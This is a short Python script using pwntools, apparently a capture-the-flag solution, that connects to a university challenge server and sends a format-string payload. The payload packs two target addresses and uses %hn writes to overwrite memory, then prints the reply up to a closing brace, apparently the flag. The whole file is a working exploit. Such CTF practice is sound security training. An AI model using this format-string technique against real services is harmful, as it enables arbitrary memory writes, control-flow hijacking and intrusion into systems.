from pwn import *

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = 22195

s = remote(SERVER, PORT, timeout=9999)

s.sendline(b'\x46\xa0\x04\x08\x44\xa0\x04\x08.%3925x.%7$hn.%2888x.%8$hn')
print(s.recvuntil(b'}'))